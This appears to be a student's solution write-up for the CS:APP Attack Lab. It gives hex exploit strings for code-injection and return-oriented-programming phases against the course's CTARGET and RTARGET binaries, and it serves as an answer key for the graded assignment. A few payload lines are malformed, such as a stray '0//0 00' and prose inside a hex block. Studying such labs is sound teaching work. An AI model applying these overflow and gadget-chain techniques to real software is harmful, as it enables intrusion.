# Things to know:
* “Overrunning the buffer typically causes the program state to be corrupted, leading to a memory access error. Your task is to be more clever with the strings you feed CTARGET and RTARGET so that they do more interesting things. These are called exploit strings.”

* if you want to create a byte with a hex value of 0, you need to write it as 00
* Put your answer backward so like 401020  -> 20 10 40
* Pre allocating memory, subtract rsp
* Assigning value to rsp, adds to rsp
* Code Injection vs Return oriented programming

# Phase 1:
* Figuring out How big the buffer by looking at
* get buff
* sub    $0x38,%rsp , 0x38 = 56
* Overflow the buffer and rewrite the return address by redirecting it to the address of touch1

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00  //56  zero/padding
9c 12 40 00 00 00 00 00 //address of touch1
```

# Phase 2:
* Look at the stack(it’ll help you understand)
* (Look at hints in the handout) store your cookie into rdi so you can pass it as an argument
mov    $0x14f987af,%rdi
* Than you are going to want to push the address of touch2 and have a return(in a .d file)
pushq  $0x4012c8
retq
You’ll get the byte representation of the assembly code and that’s what you’ll use in your answer.
* If you run getbuff(hence set a breakpoint at getbuf to see what’s happening) and run it with your answer and check what’s in your stack (do x/20x $rsp ) you’ll see that your cookie and push touch2 at first are just passed in as a string so at first it doesn’t matter that much. But then when you get to rsp
* The rsp address is at the top of the stack where your instructions are hence they’ll start being implemented, where you pass the cookie as an argument to touch2.


```
48 c7 c7 af 87 f9 14 68 //cookie
c8 12 40 00 c3 00 00 00 //push touch2
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 0//0 00
78 9c 63 55 00 00 00 00 //rsp hex after callq //address of first machine instruction
//overwrite with our first injected code
```

# Phase 3:
* Convert cookie into a string
* If it is stored in buf, then the next hexmatch may overwrite its stack, but the parent stack of buf is safe. We put the address of touch3 on the top of the parent stack.
* Your injected code should set register %rdi to the address of this string.
* “When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.”
* Rsp from phase 2 is the first thing we read which sends us to our instruction and there it grabs the cookie.

```
48 c7 c7 b8 9c 63 55 68  //  the return address should be rsp from phase 2 +0x40(64 decimal) into rdi is where the address of the string (the location where the code execution address is saved) //moving the cookie to rdi(this is where the cookie was stored previously, past the overflow point at the end of the buffer) plus buffer size+0x8 for the return address and another 0x8 for touch 3
d9 13 40 00 c3 00 00 00 //address of touch3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 9c 63 55 00 00 00 00 //rsp from phase 2//points back to the beginning where your instructions are
31 34 66 39 38 37 61 66 // cookie turn into a string
```


# Phase 4:
* the strategy is to find several instructions/byte sequence in the existing code, these instructions are followed by instructions ret(gadgets)
* Each return is equivalent to jumping from one gadget to another, and then doing so through the constant jump to complete the operation we want.
* Similar logic as phase 2 but we are using return-oriented programming
* Your first gadget will be a popq rax(58),it will pop data from the stack
* Then put your cookie address and store it in rax thanks to gadget 1, then put the cookie into edi (hence mov rax,edi is your second gadget(48 89 c7 c3))
* And then just past the address of touch2
```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00
7e 14 40 00 00 00 00 00 //gadget 1 popq rax  whatever was put at the top of the stack put into rax,//overwriting the return address with a gadget(that’s how it jumps into the stack)
When it gets a return command it looks at the return address and then it moves the stack pointer down .A return address is like popping. The gadget includes a return and then goes down to the cookie(rsp goes down to the cookie)
af 87 f9 14 00 00 00 00 //cookie Address , put cookie where rax is (stored in rax)
a6 14 40 00 00 00 00 00 //gadget 2 mov rax,edi // there is a c3 at that address
c8 12 40 00 00 00 00 00 //touch2
```


# Phase 5:
* From the moment we move the address of rsp to rax till the address of cookie, there are 9 addresses which are 8 gadgets and the address of touch3, exclude the value read in to rax and each address has 8 bytes.The gap must be 72 bytes, which is equal to the address of 0x48.
* The solution for this is to use ROP (Return Oriented Programming), what ROP does is that since we can't execute our own code, we will look for instructions in the code that do the same thing as what we want. These are called gadgets and by combining these gadgets, we will be able to perform our exploit.
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
da 14 40 00 00 00 00 00 //Mov %rsp, %rax
a6 14 40 00 00 00 00 00//Mov %rax, %rdi
99 14 40 00 00 00 00 00 //pop rax //pop data from the stack
48 00 00 00 00 00 00 00  // 9*8 = 72 =0x48 //6*8  to set up eax into esi
02 15 40 00 00 00 00 00//Movl %eax, %ecx   //89 c1
4b 15 40 00 00 00 00 00//Movl %ecx, %edx //89 ca
1d 15 40 00 00 00 00 00 //Movl %edx, %esi  //89 d6
b1 14 40 00 00 00 00 00//Lea (%rdi, %rsi, 1), %rax putting cookie into rax
a6 14 40 00 00 00 00 00//Mov %rax, %rdi
d9 13 40 00 00 00 00 00//Touch3's address
31 34 66 39 38 37 61 66//Cookie string
```
The first thing to do is to get the current %rsp address and use it to find the string.
Add this address to the offset, here is the function 0x48 just used add_xy
Find a way to put the above value into the %rdi
Follow the previous ret instruction, return touch3 the address
Store the string, for the sake of convenience, we put it to the end


# Return Oriented programming:

Performing code-injection attacks on program RTARGET is much more difficult than it is for CTARGET, because it uses two techniques to thwart such attacks:

* It uses randomization so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located.

* It marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault.

Fortunately, clever people have devised strategies for getting useful things done in a program by executing existing code, rather than injecting new code. The most general form of this is referred to as return-oriented programming (ROP) [1, 2].
The strategy with ROP is to identify byte sequences within an existing program that consist of one or more instructions followed by the instruction ret. Such a segment is referred to as a gadget. Figure 2 illustrates how the stack can be set up to execute a sequence of n gadgets. In this figure, the stack contains a sequence of gadget addresses. Each gadget consists of a series of instruction bytes, with the final one being 0xc3, encoding the ret instruction. When the program executes a ret instruction starting with this configuration, it will initiate a chain of gadget executions, with the ret instruction at the end of each gadget causing the program to jump to the beginning of the next.

A gadget can make use of code corresponding to assembly-language statements generated by the compiler, especially ones at the ends of functions. In practice, there may be some useful gadgets of this form, but not enough to implement many important operations. For example, it is highly unlikely that a compiled function would have popq %rdi as its last instruction before ret. Fortunately, with a byte-oriented instruction set, such as x86-64, a gadget can often be found by extracting patterns from other parts of the instruction byte sequence.
